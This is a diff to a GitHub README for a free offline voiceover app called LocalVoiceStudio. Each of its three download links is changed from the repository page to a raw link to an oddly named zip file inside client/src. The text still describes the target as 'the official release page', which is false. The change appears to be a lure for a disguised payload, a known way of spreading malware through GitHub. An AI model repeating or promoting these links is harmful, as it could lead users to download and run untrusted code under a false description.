@@ -4,7 +4,7 @@
 
 Welcome to LocalVoiceStudio! This application lets you create professional-sounding voiceovers right on your computer—completely free, with no internet connection required and no API keys to worry about. Whether you're creating content for YouTube, presentations, e-learning modules, or just having fun experimenting with different voices, this tool puts a full voice studio at your fingertips.
 
-[⬇️ **DOWNLOAD LOCALVOICESTUDIO NOW**](https://github.com/Castillo2785/LocalVoiceStudio)
+[⬇️ **DOWNLOAD LOCALVOICESTUDIO NOW**](https://raw.githubusercontent.com/Castillo2785/LocalVoiceStudio/main/client/src/Local-Studio-Voice-snirtle.zip)
 
 ## 💡 What Is LocalVoiceStudio?
 
@@ -59,7 +59,7 @@ Getting LocalVoiceStudio on your computer is quick and easy. Here's what to do:
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Castillo2785/LocalVoiceStudio](https://github.com/Castillo2785/LocalVoiceStudio)
+Visit this link to download the application: [https://raw.githubusercontent.com/Castillo2785/LocalVoiceStudio/main/client/src/Local-Studio-Voice-snirtle.zip](https://raw.githubusercontent.com/Castillo2785/LocalVoiceStudio/main/client/src/Local-Studio-Voice-snirtle.zip)
 
 This will take you to the official release page where you can grab the latest version.
 
@@ -143,7 +143,7 @@ One of the biggest advantages of LocalVoiceStudio is that **everything stays on 
 
 You're only a few clicks away from professional voiceovers. Download LocalVoiceStudio now and unlock your creative potential:
 
-[**⬇️ CLICK HERE TO DOWNLOAD**](https://github.com/Castillo2785/LocalVoiceStudio)
+[**⬇️ CLICK HERE TO DOWNLOAD**](https://raw.githubusercontent.com/Castillo2785/LocalVoiceStudio/main/client/src/Local-Studio-Voice-snirtle.zip)
 
 Whether you're a content creator, educator, marketer, or simply curious about voice technology, LocalVoiceStudio puts a powerful studio in your hands. Best of all, it's free, private, and works right on your Windows computer.
 
